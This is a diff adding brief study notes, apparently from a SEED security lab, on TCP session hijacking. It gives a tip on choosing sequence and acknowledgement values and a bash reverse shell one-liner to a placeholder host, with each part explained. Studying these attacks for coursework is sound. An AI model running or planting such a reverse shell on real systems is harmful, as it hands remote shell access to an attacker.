@@ -1,0 +1,14 @@
+Things learned:
+
+
+for seq and ack values in tcp-hijacking, you can use recent values (apparently the exact value doesn't particularly matter?)
+- past values are accepted but future values not (p.429 from SEED book)
+
+reverse shell command:
+- /bin/bash -i > /dev/tcp/[host ip or hostname]/[port] 0<&1 2>&1
+  - /bin/bash -i means "invoke an interactive shell"
+  - > /dev/tcp/[]/[] means "standard output device should be directed here", the directory is a bash's TCP virtual file (TCP "devices" to send/receive data)
+  - 0<&1 means "standard input device should be file descriptor 1", FD 1 represents the standard output device, which was already set to the TCP device
+  - 2>&1 means "standard error device should be file descriptor 1", (see previous line about FD 1)
+
+
